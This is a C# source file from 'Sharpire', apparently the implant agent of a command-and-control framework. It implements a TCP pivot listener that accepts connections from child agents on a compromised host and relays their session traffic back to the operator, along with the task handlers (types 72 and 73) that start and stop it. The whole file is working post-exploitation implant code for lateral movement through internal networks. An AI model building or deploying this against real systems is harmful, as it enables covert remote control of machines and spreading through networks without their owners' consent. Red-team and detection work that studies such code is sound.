using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sharpire
{
    // Background TCP listener that accepts child agents and relays their
    // routing packets through the owning Coms. Never sets SO_REUSEADDR.
    internal sealed class TcpPivotServer
    {
        internal const int ChildCap = 256;
        internal const int Backlog = 16;
        internal const int FirstFrameTimeoutMs = 30000;
        internal const int MaxSessionsPerChild = 256;

        internal static readonly Dictionary<string, TcpPivotServer> Servers = new Dictionary<string, TcpPivotServer>();
        internal static readonly object ServersLock = new object();

        private readonly string _hop;
        private readonly string _bind;
        private readonly int _port;
        private readonly Coms _coms;
        private readonly List<KeyValuePair<IPAddress, int>> _allowed = new List<KeyValuePair<IPAddress, int>>();
        private readonly bool _allowAll;
        private Socket _listener;
        private volatile bool _running;
        private int _childCount;

        internal TcpPivotServer(Coms coms, string hop, string bind, int port, string allowedSources)
        {
            _coms = coms;
            _hop = hop ?? "";
            _bind = bind;
            _port = port;
            _allowAll = string.IsNullOrEmpty(allowedSources == null ? null : allowedSources.Trim());
            if (!_allowAll) ParseAllowed(allowedSources);
        }

        internal static string KeyFor(string bind, int port)
        {
            return bind + "|" + port;
        }

        internal string Key { get { return KeyFor(_bind, _port); } }

        // Close any server already on this key, then start a new one.
        internal static void StartNew(Coms coms, string hop, string bind, int port, string allowedSources)
        {
            lock (ServersLock)
            {
                string key = KeyFor(bind, port);
                TcpPivotServer old;
                if (Servers.TryGetValue(key, out old))
                {
                    old.Stop();
                    Servers.Remove(key);
                }
                TcpPivotServer server = new TcpPivotServer(coms, hop, bind, port, allowedSources);
                server.Start();
                Servers[key] = server;
            }
        }

        internal static bool StopKey(string key)
        {
            lock (ServersLock)
            {
                TcpPivotServer server;
                if (!Servers.TryGetValue(key, out server)) return false;
                Servers.Remove(key);
                server.Stop();
                return true;
            }
        }

        internal void Start()
        {
            IPAddress addr = IPAddress.Parse(_bind);
            AddressFamily fam = _bind.IndexOf(':') >= 0 ? AddressFamily.InterNetworkV6 : AddressFamily.InterNetwork;
            Socket s = new Socket(fam, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                s.Bind(new IPEndPoint(addr, _port));
                s.Listen(Backlog);
            }
            catch
            {
                s.Close();
                throw;
            }
            _listener = s;
            _running = true;
            Thread t = new Thread(AcceptLoop);
            t.IsBackground = true;
            t.Start();
        }

        // Closes the listening socket only; connected children keep running.
        internal void Stop()
        {
            _running = false;
            Socket s = _listener;
            if (s == null) return;
            try { s.Shutdown(SocketShutdown.Both); } catch (Exception) { }
            try { s.Close(); } catch (Exception) { }
        }

        private void AcceptLoop()
        {
            Socket listener = _listener;
            while (_running)
            {
                Socket peer;
                try
                {
                    peer = listener.Accept();
                }
                catch (Exception)
                {
                    if (!_running) break;
                    Thread.Sleep(50);
                    continue;
                }

                try
                {
                    if (!IsAllowed(peer.RemoteEndPoint as IPEndPoint))
                    {
                        CloseQuietly(peer);
                        continue;
                    }
                    if (Interlocked.Increment(ref _childCount) > ChildCap)
                    {
                        Interlocked.Decrement(ref _childCount);
                        CloseQuietly(peer);
                        continue;
                    }
                }
                catch (Exception)
                {
                    CloseQuietly(peer);
                    continue;
                }

                try
                {
                    peer.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                    peer.ReceiveTimeout = FirstFrameTimeoutMs;
                    Socket p = peer;
                    Thread t = new Thread(() => Serve(p));
                    t.IsBackground = true;
                    t.Start();
                }
                catch (Exception)
                {
                    CloseQuietly(peer);
                    Interlocked.Decrement(ref _childCount);
                }
            }
        }

        private static void CloseQuietly(Socket s)
        {
            try { s.Close(); } catch (Exception) { }
        }

        private void Serve(Socket peer)
        {
            try
            {
                Func<int, byte[]> recv = delegate (int n)
                {
                    byte[] buf = new byte[n];
                    int got = 0;
                    while (got < n)
                    {
                        int r = peer.Receive(buf, got, n - got, SocketFlags.None);
                        if (r <= 0) throw new System.IO.IOException("peer closed");
                        got += r;
                    }
                    return buf;
                };

                List<string> sids = new List<string>();
                V2Frame.Decoded frame = V2Frame.ReadFrame(recv);
                if (_coms.ParseRelayPackets(frame.body).Count == 0) return;
                peer.ReceiveTimeout = 0;

                while (true)
                {
                    foreach (KeyValuePair<string, byte[]> kv in _coms.ParseRelayPackets(frame.body))
                    {
                        if (kv.Key == "00000000" || sids.Contains(kv.Key)) continue;
                        if (sids.Count < MaxSessionsPerChild) sids.Add(kv.Key);
                    }

                    byte[] batch;
                    try
                    {
                        string primary = sids.Count > 0 ? sids[0] : "00000000";
                        List<KeyValuePair<string, byte[]>> own = _coms.ParseRelayPackets(frame.body);
                        if (own.Count > 0 && own[0].Key != "00000000") primary = own[0].Key;
                        _coms.RelayChildFrame(frame.kind, frame.hop, frame.body, primary);

                        byte[][] childPackets = _coms.DrainForSession(primary, V2Frame.MAX_COUNT);
                        int total = 0;
                        foreach (byte[] cp in childPackets) total += cp.Length;
                        byte[] reply = new byte[total];
                        int off = 0;
                        foreach (byte[] cp in childPackets)
                        {
                            Buffer.BlockCopy(cp, 0, reply, off, cp.Length);
                            off += cp.Length;
                        }

                        int room = V2Frame.MAX_COUNT - childPackets.Length;
                        List<byte[]> relays = new List<byte[]>();
                        foreach (string sid in sids)
                        {
                            if (room <= 0) break;
                            if (sid == primary) continue;
                            byte[][] more = _coms.DrainForSession(sid, room);
                            foreach (byte[] m in more) relays.Add(m);
                            room -= more.Length;
                        }
                        batch = V2Frame.BuildBatch(reply, relays);
                    }
                    catch (Exception)
                    {
                        batch = V2Frame.BuildBatch(new byte[0], new List<byte[]>());
                    }

                    peer.Send(batch);
                    frame = V2Frame.ReadFrame(recv);
                }
            }
            catch (Exception)
            {
            }
            finally
            {
                CloseQuietly(peer);
                Interlocked.Decrement(ref _childCount);
            }
        }

        // ---- AllowedSources ----

        private void ParseAllowed(string spec)
        {
            foreach (string raw in spec.Split(','))
            {
                string entry = raw.Trim();
                if (entry.Length == 0) continue;
                try
                {
                    int slash = entry.IndexOf('/');
                    IPAddress ip;
                    int prefix;
                    if (slash < 0)
                    {
                        ip = Normalize(IPAddress.Parse(entry));
                        prefix = ip.GetAddressBytes().Length * 8;
                    }
                    else
                    {
                        ip = Normalize(IPAddress.Parse(entry.Substring(0, slash)));
                        prefix = int.Parse(entry.Substring(slash + 1));
                        int max = ip.GetAddressBytes().Length * 8;
                        // A mapped v6 CIDR (/96+) narrows to the v4 prefix.
                        if (ip.AddressFamily == AddressFamily.InterNetwork &&
                            IPAddress.Parse(entry.Substring(0, slash)).AddressFamily == AddressFamily.InterNetworkV6)
                            prefix -= 96;
                        if (prefix < 0 || prefix > max) continue;
                    }
                    _allowed.Add(new KeyValuePair<IPAddress, int>(ip, prefix));
                }
                catch (Exception)
                {
                    // skip bad entry
                }
            }
        }

        // IPv4-mapped IPv6 (::ffff:a.b.c.d) -> IPv4.
        private static IPAddress Normalize(IPAddress ip)
        {
            byte[] b = ip.GetAddressBytes();
            if (b.Length == 16)
            {
                for (int i = 0; i < 10; i++) if (b[i] != 0) return ip;
                if (b[10] == 0xFF && b[11] == 0xFF)
                    return new IPAddress(new byte[] { b[12], b[13], b[14], b[15] });
            }
            return ip;
        }

        private bool IsAllowed(IPEndPoint remote)
        {
            if (_allowAll) return true;
            if (remote == null) return false;
            byte[] addr = Normalize(remote.Address).GetAddressBytes();
            foreach (KeyValuePair<IPAddress, int> a in _allowed)
            {
                byte[] net = a.Key.GetAddressBytes();
                if (net.Length != addr.Length) continue;
                int bits = a.Value;
                bool match = true;
                for (int i = 0; i < net.Length && bits > 0; i++, bits -= 8)
                {
                    int mask = bits >= 8 ? 0xFF : (0xFF << (8 - bits)) & 0xFF;
                    if ((addr[i] & mask) != (net[i] & mask)) { match = false; break; }
                }
                if (match) return true;
            }
            return false;
        }
    }

    partial class Coms
    {
        partial void TryPivotTask(PACKET packet, ref byte[] result)
        {
            if (packet.type == 72) result = StartTcpPivot(packet);
            else if (packet.type == 73) result = StopTcpPivot(packet);
        }

        // payload: "hop|bindAddress|port|allowedSources"
        private byte[] StartTcpPivot(PACKET packet)
        {
            ushort taskId = packet.taskId;
            string payload = packet.data ?? "";
            try
            {
                string[] parts = payload.Split(new char[] { '|' }, 4);
                if (parts.Length < 3) throw new ArgumentException("bad pivot payload");
                string bind = parts[1];
                int port = int.Parse(parts[2]);
                string allowed = parts.Length > 3 ? parts[3] : "";
                TcpPivotServer.StartNew(this, parts[0], bind, port, allowed);
                jobTracking.jobs[taskId.ToString()].Status = "running";
                return EncodePacket(72, "[*] TCP pivot listening on " + bind + " port " + port, taskId);
            }
            catch (Exception e)
            {
                jobTracking.jobs[taskId.ToString()].Status = "error";
                return EncodePacket(72, "[!] TCP pivot: " + e.Message, taskId);
            }
        }

        // payload: "bindAddress|port"
        private byte[] StopTcpPivot(PACKET packet)
        {
            ushort taskId = packet.taskId;
            string key = (packet.data ?? "").Trim();
            bool existed = TcpPivotServer.StopKey(key);
            jobTracking.jobs[taskId.ToString()].Status = "completed";
            return EncodePacket(73, existed
                ? "[*] TCP pivot stopped listening on " + key
                : "[!] TCP pivot: not listening on " + key, taskId);
        }
    }
}
